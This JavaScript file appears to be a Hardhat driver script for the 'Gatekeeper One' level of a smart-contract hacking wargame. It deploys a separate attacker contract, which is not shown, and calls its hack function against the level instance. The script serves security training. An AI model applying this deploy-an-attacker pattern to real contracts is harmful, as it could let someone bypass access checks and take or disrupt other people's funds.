const {BLOCK_EXPLORER_URL, GATEKEEPER_ONE_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Gatekeeper One level');

    if (!GATEKEEPER_ONE_INSTANCE_ADDRESS) {
        console.log('Gatekeeper One instance address not found');
        return;
    }

    console.log('Gatekeeper One instance address', GATEKEEPER_ONE_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("GatekeeperOne");
    const contract = factory.attach(GATEKEEPER_ONE_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("GatekeeperOneAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    const tx = await attackerContract.hack(contract.address, 1, 1000);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Gatekeeper One level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
